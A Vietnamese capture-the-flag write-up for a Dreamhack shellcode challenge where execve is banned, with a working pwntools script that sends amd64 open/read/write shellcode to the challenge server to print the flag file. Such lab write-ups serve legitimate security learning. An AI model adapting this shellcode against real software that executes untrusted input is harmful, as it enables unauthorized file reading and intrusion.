# Phân tích code

<img width="1322" height="621" alt="image" src="https://github.com/user-attachments/assets/87207a1b-abc5-4b8a-a401-e10338e778ee" />

Điểm đầu tiên chú ý đến trong chương trình là hàm `banned_execve` sẽ cấm các hàm tạo shell như `system("/bin/sh")` có nghĩa bài này
ta phải lấy được flag qua các cách khác. 

Tiếp theo là trong hàm main có khởi tạo 1 vùng nhớ có quyền `rwx` cho phép toàn quyền đọc, ghi, thực thi câu lệnh. Ngay bên dưới
có hàm trỏ ngay đến vùng nhớ đó để thực thi.

Vì chương trình cho phép ta ghi vào vùng nhớ trên nên chỉ cần đưa shellcode vào để thực thi. Nhưng ta sẽ không gọi hàm tạo shell 
(do `banned_execve`) mà mở flag qua `open`, `read` và  `write`.

<img width="717" height="407" alt="image" src="https://github.com/user-attachments/assets/51049d35-b0d1-4fae-8d33-ebc78f9e34d4" />

Challange có cho sẵn đường dẫn file flag chỉ cần đưa lên làm tham số của `open` để mở. 

<img width="861" height="352" alt="image" src="https://github.com/user-attachments/assets/70a5fc17-14fa-4364-a4c4-e942b908e013" />

Vì tên file quá dài nên chia ra thành từng phần 8 BYTE đưa vào Stack rồi đưa con trỏ Stack vào thanh ghi rdi.

<img width="1570" height="860" alt="image" src="https://github.com/user-attachments/assets/6cb3744e-c353-46ea-ba88-d7d6ce5cde60" />

Đẩy vào đầu thì sẽ nằm cuối nên ta push từ BYTE cuối trước. BYTE NULL là cần thiết để cho biết kết thúc đường dẫn.

### Script python

    #!/usr/bin/env python3
    from pwn import *
    p=remote('host3.dreamhack.games',9200)
    
    payload=asm('''
    	mov r13,rdx
    
    	mov rax,0
    	push rax
    	mov rax,7453016957746376559
    	push rax
    	mov rax,7809087175292972385
    	push rax
    	mov rax,7953189135087710051
    	push rax
    	mov rax,7598524071439789157
    	push rax
    	mov rax,7526411514940450863
    	push rax
    
    	mov rax,2
    	mov rdi,rsp
    	xor rsi,rsi
    	xor rdx,rdx
    
    	syscall
    
    	mov rax,0
    	mov rdi,3
    	mov rsi,r13
    	mov rdx,0x100
    
    	syscall
    
    	mov rdx,rax
    	mov rax,1
    	mov rdi,1
    	mov rsi,r13
    
    	syscall
    
    	''', arch='amd64')
    
    p.sendlineafter(b'shellcode: ',payload)

p.interactive()
